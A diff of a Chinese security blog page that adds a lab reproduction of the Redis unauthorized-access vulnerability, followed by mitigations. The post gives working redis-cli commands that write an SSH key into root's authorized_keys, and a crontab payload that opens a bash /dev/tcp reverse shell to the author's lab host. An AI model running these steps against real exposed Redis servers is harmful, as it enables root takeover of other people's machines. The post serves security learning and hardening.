@@ -13,7 +13,7 @@
 
     <title>
         
-          redis未授权访问漏洞 - ss-test
+          1_redis未授权访问漏洞 - ss-test
         
     </title>
 
@@ -141,8 +141,10 @@
                 <div class="post-heading">
                     <div class="tags">
                         
+                          <a class="tag" href="/tags/#redis" title="redis">redis</a>
+                        
                     </div>
-                    <h1>redis未授权访问漏洞</h1>
+                    <h1>1_redis未授权访问漏洞</h1>
                     <h2 class="subheading"></h2>
                     <span class="meta">
                         Posted by nobody from nowhere on
@@ -165,7 +167,41 @@
                 col-md-10 col-md-offset-1
                 post-container">
 
-                
+                <h2 id="漏洞来源"><a href="#漏洞来源" class="headerlink" title="漏洞来源"></a>漏洞来源</h2><p><a href="http://www.freebuf.com/column/158065.html" target="_blank" rel="external">http://www.freebuf.com/column/158065.html</a></p>
+<h2 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h2><p>1.Redis服务使用root账号启动<br>2.Redis服务无密码认证或者使用的是弱口令进行认证<br>3.服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</p>
+<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Redis因配置不当可以导致未授权访问，被攻击者恶意利用。当前流行的针对Redis未授权访问的一种新型攻击方式，在特定条件下，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器，可导致服务器权限被获取和数据删除、泄露或加密勒索事件发生，严重危害业务正常服务。部分服务器上的Redis 绑定在 0.0.0.0:6379，并且没有开启认证（这是Redis的默认配置），以及该端口可以通过公网直接访问，如果没有采用相关的策略，比如添加防火墙规则避免其他非信任来源ip 访问等，将会导致 Redis 服务直接暴露在公网上，可能造成其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="安装-配置redis"><a href="#安装-配置redis" class="headerlink" title="安装/配置redis"></a>安装/配置redis</h3><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">sudo apt install redis-server</div></pre></td></tr></table></figure>
+<p>安装完成之后Redis服务器会在<code>127.0.0.1:6379</code>自动启动,且无需认证：<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ ps aux|grep redis</div><div class="line">redis      3754  0.1  0.1  51440  2552 ?        Ssl  03:46   0:00 /usr/bin/redis-server 127.0.0.1:6379</div></pre></td></tr></table></figure></p>
+<h3 id="测试redis"><a href="#测试redis" class="headerlink" title="测试redis"></a>测试redis</h3><p>安装Redis服务器，会自动地一起安装Redis命令行客户端程序。在本机输入redis-cli命令就可以通过客户端程序访问redis服务器。<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">cqq@ubuntu:/var/www$ redis-cli</div><div class="line">127.0.0.1:6379&gt; keys *</div><div class="line">(empty list or set)</div><div class="line">127.0.0.1:6379&gt; set name &quot;cqq&quot;</div><div class="line">OK</div><div class="line">127.0.0.1:6379&gt; get name</div><div class="line">&quot;cqq&quot;</div><div class="line">127.0.0.1:6379&gt; keys *</div><div class="line">1) &quot;name&quot;</div></pre></td></tr></table></figure></p>
+<p>可以使用<code>info</code>命令查看redis的基本信息。<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">127.0.0.1:6379&gt; info</div><div class="line"># Server</div><div class="line">redis_version:4.0.9</div><div class="line">redis_git_sha1:00000000</div><div class="line">redis_git_dirty:0</div><div class="line">redis_build_id:1bc80a08306a3efd</div><div class="line">redis_mode:standalone</div><div class="line">os:Linux 4.15.0-33-generic x86_64</div><div class="line">arch_bits:64</div><div class="line">...</div></pre></td></tr></table></figure></p>
+<p>配置文件为：<code>/etc/redis/redis.conf</code>,若修改了默认配置文件，使redis在其他网卡或<code>0.0.0.0</code>监听，则可能导致可通过网络访问。</p>
+<h3 id="修改redis默认配置"><a href="#修改redis默认配置" class="headerlink" title="修改redis默认配置"></a>修改redis默认配置</h3><p>将<code>bind 127.0.0.1</code>修改为<code>bind 0.0.0.0</code>，然后重启redis。<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">sudo service redis restart</div></pre></td></tr></table></figure></p>
+<p>可以看到redis已经在<code>0.0.0.0:6379</code>监听了。<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">cqq@ubuntu:~$ ps aux|grep redis</div><div class="line">cqq        3858  0.0  0.1  20880  2812 pts/0    S+   03:51   0:00 redis-cli</div><div class="line">redis      3899  0.0  0.1  51440  2248 ?        Ssl  03:57   0:00 /usr/bin/redis-server 0.0.0.0:6379</div></pre></td></tr></table></figure></p>
+<h3 id="Mac安装redis-cli并通过局域网访问存在漏洞的redis"><a href="#Mac安装redis-cli并通过局域网访问存在漏洞的redis" class="headerlink" title="Mac安装redis-cli并通过局域网访问存在漏洞的redis"></a>Mac安装redis-cli并通过局域网访问存在漏洞的redis</h3><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">wget http://download.redis.io/releases/redis-4.0.11.tar.gz</div><div class="line">tar zxf redis-4.0.11.tar.gz</div><div class="line">cd redis-4.0.11</div><div class="line">cd src</div><div class="line">make &amp;&amp; make test</div><div class="line">sudo make install</div></pre></td></tr></table></figure>
+<p>然后就可以通过局域网访问在<code>0.0.0.0:6379</code>监听的redis了。<br><img src="Screenshot_2018-10-15_9.37.49.png" alt=""><br>然后就可以访问敏感信息了，比如redis服务版本信息，os的内核信息，甚至redis配置文件的绝对路径。<br>还可以删除某key：<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">192.168.170.217:6379&gt; del &quot;name&quot;</div><div class="line">(integer) 1</div><div class="line">192.168.170.217:6379&gt; keys *</div><div class="line">(empty list or set)</div></pre></td></tr></table></figure></p>
+<h3 id="写入ssh公钥，获取操作系统权限"><a href="#写入ssh公钥，获取操作系统权限" class="headerlink" title="写入ssh公钥，获取操作系统权限"></a>写入ssh公钥，获取操作系统权限</h3><p>首先在自己电脑上生成一对公私钥<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">ssh-keygen -t rsa</div><div class="line">[~/.ssh]$ ls|grep id_rsa                                                                                                                           </div><div class="line">id_rsa</div><div class="line">id_rsa.pub</div></pre></td></tr></table></figure></p>
+<p>如果已经有了，就不用重复操作了。<br>若redis服务器以root帐号运行:<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ sudo /usr/bin/redis-server /etc/redis/redis.conf</div><div class="line">$ ps aux|grep redis</div><div class="line">root       5401  0.1  0.1  51440  3840 ?        Ssl  07:07   0:00 /usr/bin/redis-server 0.0.0.0:6379</div></pre></td></tr></table></figure></p>
+<p>然后后续想要在<code>/root/.ssh/</code>目录下写文件，需要设置redis的备份路径为<code>/root/.ssh</code>，前提是<code>/root/.ssh/</code>目录必须存在。<br>否则会出现以下错误：<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">192.168.170.217:6379&gt; config set dir /root/.ssh/</div><div class="line">(error) ERR Changing directory: No such file or directory</div></pre></td></tr></table></figure></p>
+<p>当我手动新建<code>/root/.ssh/</code>目录后，才能设置成功。<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">192.168.170.217:6379&gt; config set dir /root/.ssh/</div><div class="line">OK</div></pre></td></tr></table></figure></p>
+<p>然后设置保存文件名为<code>authorized_keys</code>，</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">192.168.170.217:6379&gt; config set dbfilename authorized_keys</div><div class="line">OK</div></pre></td></tr></table></figure>
+<p>最后保存，数据就会被写到服务器上的<code>dir</code>目录下的<code>dbfilename</code>文件中。<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">192.168.170.217:6379&gt; save</div><div class="line">OK</div></pre></td></tr></table></figure></p>
+<p>关于这两个参数的含义，在redis的配置文件<code>/etc/redis/redis.conf</code>中有。</p>
+<blockquote>
+<p>dir: The DB will be written inside this directory, with the filename specified above using the ‘dbfilename’ configuration directive.<br>dbfilename: The filename where to dump the DB</p>
+</blockquote>
+<p><img src="Screenshot_2018-10-15_10.20.11.png" alt=""><br>然后查看<code>/root/.ssh/authorized_keys</code>发现已经被写入了。<br><img src="Screenshot_2018-10-15_10.26.04.png" alt=""><br>现在尝试直接用root登录，发现可以登录成功了。<br><img src="redis-root.gif" alt=""></p>
+<h3 id="在crontab里写定时任务，反弹shell"><a href="#在crontab里写定时任务，反弹shell" class="headerlink" title="在crontab里写定时任务，反弹shell"></a>在crontab里写定时任务，反弹shell</h3><p>原理是和写公钥一样的，只是变换一下写入的内容和路径，数据库名。<br>先在本机某端口进行监听：<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ nc -lv 192.168.170.1 4444</div></pre></td></tr></table></figure></p>
+<p>由于crontab命令最小的执行时间是一分钟，这里可以写一个一分钟后向指定IP端口反弹shell的crontab命令。<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">192.168.170.217:6379&gt; set x &quot;\n\n* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.170.1/4444 0&gt;&amp;1\n\n&quot;</div><div class="line">OK</div><div class="line">192.168.170.217:6379&gt; config set dir /var/spool/cron/crontabs/</div><div class="line">OK</div><div class="line">192.168.170.217:6379&gt; config set dbfilename root</div><div class="line">OK</div><div class="line">192.168.170.217:6379&gt; save</div><div class="line">OK</div></pre></td></tr></table></figure></p>
+<p>查看crontab，确实有，<br><img src="Screenshot_2018-10-15_11.32.28.png" alt=""><br>然而并没有反弹shell…</p>
+<h3 id="往web路径写webshell"><a href="#往web路径写webshell" class="headerlink" title="往web路径写webshell"></a>往web路径写webshell</h3><p>若开启redis服务的帐号有web目录的写权限，则可以尝试往web路径写webshell。<br>【略】</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>反正都是利用可以指定数据库文件名向指定目录写文件，也就是说，如果运行redis服务的用户权限足够高，那么就可以向任意路径写任意文件。</p>
+<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><h3 id="指定redis服务使用的网卡-（需要重启redis才能生效）"><a href="#指定redis服务使用的网卡-（需要重启redis才能生效）" class="headerlink" title="指定redis服务使用的网卡 （需要重启redis才能生效）"></a>指定redis服务使用的网卡 （需要重启redis才能生效）</h3><p>在配置文件<code>redis.conf</code>中找到 # bind 127.0.0.1 ，把前面的#号去掉，然后保存。注：修改后只有本机才能访问Redis。</p>
+<h3 id="设置防火墙策略-添加访问redis的白名单"><a href="#设置防火墙策略-添加访问redis的白名单" class="headerlink" title="设置防火墙策略, 添加访问redis的白名单"></a>设置防火墙策略, 添加访问redis的白名单</h3><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">iptables -A INPUT -s x.x.x.x -p tcp --dport 6379 -j ACCEPT</div></pre></td></tr></table></figure>
+<h3 id="设置访问密码-（需要重启redis才能生效）"><a href="#设置访问密码-（需要重启redis才能生效）" class="headerlink" title="设置访问密码 （需要重启redis才能生效）"></a>设置访问密码 （需要重启redis才能生效）</h3><p>在配置文件<code>redis.conf</code>中找到<code>requirepass</code>字段，在后面填上你需要的密码，Redis客户端也需要使用此密码来访问Redis服务。</p>
+<h3 id="权限最小原则"><a href="#权限最小原则" class="headerlink" title="权限最小原则"></a>权限最小原则</h3><p>以低权限运行redis服务，且并禁用该账号的登录权限。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://blog.fens.me/linux-redis-install/" target="_blank" rel="external">http://blog.fens.me/linux-redis-install/</a><br><a href="https://my.oschina.net/90888/blog/1574657" target="_blank" rel="external">https://my.oschina.net/90888/blog/1574657</a><br><a href="https://docs.oracle.com/cd/E24847_01/html/819-6951/sysrescron-24589.html" target="_blank" rel="external">https://docs.oracle.com/cd/E24847_01/html/819-6951/sysrescron-24589.html</a><br><a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/crontab.html" target="_blank" rel="external">https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/crontab.html</a><br><a href="https://www.nanoxika.com/?p=322" target="_blank" rel="external">https://www.nanoxika.com/?p=322</a></p>
+
 
                 <hr>
 
@@ -206,6 +242,8 @@
                     <h5><a href="/tags/">FEATURED TAGS</a></h5>
                     <div class="tags">
                        
+                          <a class="tag" href="/tags/#redis" title="redis">redis</a>
+                        
                     </div>
                 </section>
                 
